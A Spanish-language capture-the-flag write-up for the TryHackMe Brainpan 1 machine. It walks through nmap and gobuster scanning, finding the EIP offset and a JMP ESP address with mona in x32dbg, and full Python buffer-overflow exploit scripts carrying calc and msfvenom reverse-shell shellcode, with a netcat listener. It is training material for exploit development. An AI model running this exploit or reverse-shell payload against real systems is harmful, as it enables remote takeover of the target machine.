# Writeup-Brainpan-1
Este Writeup está hecho para la Máquina de Tryhackme Brainpan 1(https://tryhackme.com/room/brainpan).

# Primeros pasos
Acceder a este github(https://github.com/therealdreg/x64dbg-exploiting), seguir todos sus pasos hasta poder ejecutar correctamente el x32dbg.

Una vez podamos usar el x32gdb, debemos descargar el "brainpan.exe" de la máquina de Tryhackme y pasarla a nuestra máquina virtual de windows para poder empezar a explotarla.

# Descargar Brainpan.exe

Primero que todo vamos a realizar un nmap a la máquina víctima en una Linux o una Kali con: ```nmap -sC -sV -Pn -vv MACHINE_IP```

![9c2702df80221a86278c7c78f951cadd](https://user-images.githubusercontent.com/107114264/172879053-4c1bb899-d6a8-4a1f-a150-65cc5256f62e.png)

Vemos que en el puerto 10000 hay un servicio http abierto, vamos a ver qué es.

Abrimos en nuestro navegador ```MACHINE_IP:10000```

Sale esta imagen:

![d491cc6d0de1351e00545a314d0f13a5](https://user-images.githubusercontent.com/107114264/172894811-1acac295-4a91-49e4-bd3b-737abeb48256.png)

Vamos a buscar en esta página con un gobuster para ver si hay algún directorio:

```gobuster dir -u http://MACHINE_IP:10000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50```

Podemos ver que nos dice que hay un directorio en /bin:

![839c8bad542301cb40141adf11d53b21](https://user-images.githubusercontent.com/107114264/172883850-0f073e3e-d5eb-4f78-b2ee-3a003c365cc5.png)

Vamos a ir hasta esa página ```MACHINE_IP:10000/bin``` y vemos que sale lo siguiente:

![75234ba7e0773198af8b8b06242c79d1](https://user-images.githubusercontent.com/107114264/172884736-c65f5e69-78b9-4832-8788-96cf9e0189fe.png)

Es el programa vulnerable que necesitamos descargar así que, todo listo!

Únicamente pasaría pasarlo a nuestra máquina virtual de Windows y abrir este programa con x32dbg, Vamos a ello!

¡¡¡¡ANTES DE SEGUIR!!!!: Si no queréis ver como se hace la máquina paso a paso, aquí os dejo mi Autpwn de esta máquina:

https://github.com/Kalugh/Autopwn-Brainpan-1

# Empezamos con x32dbg

La Kali sólo la necesitaremos más adelante para crear una reverse con msfvenom, pero por ahora únicamente necesitamos la windows.

Vamos ha abrir el programa x32dbg y le decimos que habra el "brainpan.exe"

Tendremos que crear un script para ejecutar un exploit en este programa y vamos a utilizar esta plantilla:

```
import socket

ip = "127.0.0.1"
port = 9999

prefix = ""
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Utilizamos ip ```127.0.0.1``` para explotar el programa en local antes de mandarlo contra el de Tryhackme.

Utilizamos port ```9999``` ya que al hacer nmap vemos que este es el puerto por el cual el programa vulnerable escucha.

# Comandos Útiles a destacar usando x32dbg

```
import mona
mona.mona("help")
mona.mona("config -set workingfolder c:\\logs\\%p")
--------------------------------------------------------------------------------

mona.mona("pattern_create 2000")

mona.mona('bytearray -cpb "\\x00"')

mona.mona('compare -f C:\\logs\\oscp\\bytearray.bin -a ESP')

mona.mona("pattern_offset EIP")

mona.mona("jmp -r esp") 

mona.mona("jmp -r esp -m *")
```

# Empezamos utilizando x32dbg para explotar "brainpan.exe"

Una vez ejecutemos x32dbg necesitamos abrir el brainpan.exe con este icono:  ![db234df149a0f867d4c97a6af5adccad](https://user-images.githubusercontent.com/107114264/172898251-98daa22d-8973-4f61-ab39-9b4e25b15a68.png)

Una vez abierto el programa deberías ver algo así:

![f5f06dd737cadd684057ded03b1fb997](https://user-images.githubusercontent.com/107114264/172898425-bd11941b-4771-4070-a952-aa8d4518effd.png)

Vamos a la zona de "Log" y ejecutamos estos tres comandos en orden:

```
import mona
mona.mona("help")
mona.mona("config -set workingfolder c:\\logs\\%p")
```

Si hemos ejecutado todo bien, con el último comando debería salir algo así:

![f929f627bb766bd137b526302190730c](https://user-images.githubusercontent.com/107114264/172898892-eb6d3d0b-146d-45a1-a58b-fe098abe1015.png)

Si has conseguido todo esto, ¡vas muy bien!

Vamos a crear nuestro patrón para saber cuantos bytes son necesarios hasta llegar hasta EIP.(Lo podéis encontrar en la parte derecha)

![48e40c87b3e3792a3a83f9ed94f40168](https://user-images.githubusercontent.com/107114264/172899432-991ccfcf-9383-4991-9319-6f16e0f8b77c.png)

Crearemos nuestro patrón con este comando: ```mona.mona("pattern_create 2000")```

Y lo añadimos al payload de esta manera:

![8fa4f3ab77728438c8305ded1aa29fb3](https://user-images.githubusercontent.com/107114264/172899847-3cd829c3-8c22-41cb-a696-1063b2d0fa1a.png)

Abrimos un cmd para poder ejecutar con Python3 nuestro script

Dentro del x32dgb ejecutamos un restart y empezamos a darle a ejecutar el programa hasta que se inicie:![54dc865e631cfdb40e124d708334b11a](https://user-images.githubusercontent.com/107114264/172900396-5f9fb7f1-8e7e-485f-999c-0cdf0e049cce.png)

Una vez se inicie ejecutamos nuestro scrip hasta que lo reciba y podemos verlo dentro del "brainpan.exe" que nos abre el x32dgb

Lo veríamos así una vez entre el payload.

![a45be35701181db04953c9ef44b01dd5](https://user-images.githubusercontent.com/107114264/172900816-e7a5e23c-d57d-4039-b040-78c917798c8f.png)

Tendremos que hacer esto cada vez que agregemos algo nuevo a nuestro script para que se cargue todo bien, es decir hacer un restart, ejecutar el programa de nuevo y ejecutar nuestro script desde el cmd, en este orden.

Ahora dentro de "Log" ejecutamos este comando: ```mona.mona("pattern_offset EIP")``` Para comparar lo que haya dentro de EIP con el patron que hemos metido y asi el programa automáticamente nos dice cuantos bytes necesitamos.

En este caso vemos que nos da esto:

![b60d72dafc25677003b7d926bef65ecf](https://user-images.githubusercontent.com/107114264/172901623-e208bf1b-6686-4a51-84aa-25e569967b81.png)

Es decir necesitamos 524 bytes para llegar hasta EIP y lo haremos de la siguiente manera.

Vamos a reemplazar el patter create anterior con ```"\x41" * 524```

Debajo de esta línea meteremos otro payload para que acabe encima de EIP.

```payload += "\x42" * 4```

Quedaría así: ![7aa16223064eec3d581f91874a81d9e2](https://user-images.githubusercontent.com/107114264/172903506-7caf551c-a621-4cfb-847a-f70c47993ae3.png)

Volvemos ha hacer un restart en el x32dgb le damos a run hasta que aparezca el brainpan.exe, y ejecutamos nuestro script.

Una vez ejecutado tendrías que ver tanto las A como los x42 que son B en ASCII en la parte de la derecha.

![2e1ff28fc27029c30d63e7a4afdf4085](https://user-images.githubusercontent.com/107114264/172904160-8d0320da-3cc7-48cb-ba96-4d218f4253ac.png)

Y abajo a la derecha veríamos que lo úlimo en el stack son los x42, es decir que lo siguiente que se introduzca va a ser directamente ejecutado.

![31dbb245d07e0b707c152812e66533f0](https://user-images.githubusercontent.com/107114264/172905242-45b7dd49-ea48-4d41-a29b-dfa7cadd028a.png)

Aquí no os preocupéis sino os sale igual, lo importante es que veáis tanto los x41 y los x42

# Empezamos a buscar Badchars

Vamos a ejecutar nuestro comando para generar un bytearray ```mona.mona('bytearray -cpb "\\x00"')```

Al ejecutarlo os saldrá algo así:

```
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

Lo tendremos que añadir debajo de los x42 dentro de nuestro payload. Hacedlo de esta manera para que funcione:

![174c76c713ad741ff5a7cf9afcfd5c0f](https://user-images.githubusercontent.com/107114264/172904717-037e6e62-f364-465e-b113-dc7c5459f599.png)

Volvemos a hacerle un restart, que se abra el brainpan.exe y ejecutamos nuestro script.

Una vez ejecutado haremos un compare, si hicisteis bien la parte de ```import mona```, debería funcionaros esto:

```mona.mona('compare -f C:\\logs\\brainpan\\bytearray.bin -a ESP')```

En este caso, hemos tenido suerte y ya nos saca un HOORAY, es decir que ya funciona el exploit!!

![8b88e98b91b0123e6ee7af1532e1ed5d](https://user-images.githubusercontent.com/107114264/172905955-9e2c1e3a-8bb8-49b6-bc4c-34392e71d9f3.png)

# Buscando jump esp para brainpan.exe

Seguiremos trabajando con el x32dgb, este comando es el siguiente: ```mona.mona("jmp -r esp")```

Hacemos un restart al x32dgb, le damos al run hasta que se ejecute el programa y sin ejecutar nuestro script esta vez ejecutamos ese comando dentro de "Log".

Esta vez solo hay un Jmp exp, veamos si funciona, copiar esa dirección.

![8badc959f8b25e8455e7614fc5145fed](https://user-images.githubusercontent.com/107114264/172909356-60a29e3c-d81b-489c-b365-2ccd34fb5459.png)

Tendremos que ponerlo dentro del retn, y sobreescribir las B con el retn

![f614589c60bf0093d6556b8581860b3e](https://user-images.githubusercontent.com/107114264/172913429-0c2d55aa-29da-4840-bd4c-cc6b63e67a94.png)

Introduciremos dentro del script esta shellcode para comprobar si el jmp esp funciona, si llega a funcionar, se tendría que abrir una calculadora.

```
import socket

ip = "127.0.0.1"
port = 9999

# badchars \x00
# 0x311712f3
shellcode_calc = '\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2\x52\xff\xd0'


prefix = ""
offset = 0
overflow = "A" * offset
retn = "\xf3\x12\x17\x31"
padding = ""
payload = "\x41" * 520 # Esto está cambiado para que entre bien el retorno
payload += retn
payload += shellcode_calc

postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Este es el ejemplo de cómo lo tengo yo. Ahora vayamos al x32dgb hacemos el restart, le damos al run hasta que aparezca el programa y ahora sí ejecutamos el exploit a través del cmd.

Si se os abre la calculadora, significa que ya hemos conseguido explotar el programa, felicidades!!!

![77fafc525c448bf389b7d39e611306a3](https://user-images.githubusercontent.com/107114264/172914284-e794916c-7fc1-4cfc-b96f-259b3ff9029b.png)

# Creamos la reverse shell con msfvenom en Kali

Usaremos este comando para crear nuestra reverse shell con msfvenom en una Linux o una Kali: ```msfvenom -p linux/x86/shell_reverse_tcp LHOST=VPN_IP LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -a x86 -b "\x00"```

En VPN_IP pondremos la ip de la VPN con la máquina que queráis entrar, yo en mi caso usaré la VPN de windows.

Dentro del cmd con el OpenVpn ya abiero y conectado usaremos ipconfig para ver nuestra ip.

![e793dba398307ed5a06bb5c42f726d68](https://user-images.githubusercontent.com/107114264/172914859-fdc8a6e0-d973-4700-9345-15fbaee50f8e.png)

En mi caso es la ```10.11.70.166```

![b634bb1975960143111e2235854bcf4b](https://user-images.githubusercontent.com/107114264/172916157-a8eb9c87-e20f-4a1e-9a62-eff533aff521.png)

No hace falta ejecutarlo en root, no os preocupéis por eso.

Tendremos que cambiar la ip ```127.0.0.1``` a ```MACHINE_IP```. Básicamente la ip de la máquina de tryhackme.

Os vuelvo a enseñar cómo está mi script para que podáis ir comparandolo con el vuestro.

```
import socket

ip = "10.10.6.19"
port = 9999

# badchars \x00
# 0x311712f3

prefix = ""
offset = 0
overflow = "A" * offset
retn = "\xf3\x12\x17\x31"
padding = ""
payload = "\x41" * 520
payload += retn
payload += "\x90" * 30
payload += "\xbd\x84\x40\xd5\x74\xdb\xc8\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
payload += "\x12\x31\x68\x12\x83\xe8\xfc\x03\xec\x4e\x37\x81\xdd\x95\x40"
payload += "\x89\x4e\x69\xfc\x24\x72\xe4\xe3\x09\x14\x3b\x63\xfa\x81\x73"
payload += "\x5b\x30\xb1\x3d\xdd\x33\xd9\xb7\x16\x82\xbf\xa0\x2a\x0a\xae"
payload += "\x6c\xa2\xeb\x60\xea\xe4\xba\xd3\x40\x07\xb4\x32\x6b\x88\x94"
payload += "\xdc\x1a\xa6\x6b\x74\x8b\x97\xa4\xe6\x22\x61\x59\xb4\xe7\xf8"
payload += "\x7f\x88\x03\x36\xff"


postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```
Este script tenemos que ejecutarlo ahora en nuestra Kali para poder seguir con el exploit

Si veis que hay unos \x90 nuevos, significan NOP, esto se hace porque al crear la reverse con msfvenom la shell se autodestruye y necesita más espacio en blanco para funcionar.

Si estáis en Linux o Kali podéis ejecutar directamente este comando: ```nc -nvlp 4444``` 

![5064e620de7da82824250ac8f7d21cd2](https://user-images.githubusercontent.com/107114264/172918398-a8140d2d-e24e-48ce-a23b-e1b98ab7eec5.png)

Guardamos el exploit, nos ponemos a la escucha cómo se ve en la imagen y después ejecutamos el exploit.



Con eso deberíamos conseguir acceso a la máquina de Tryhackme.

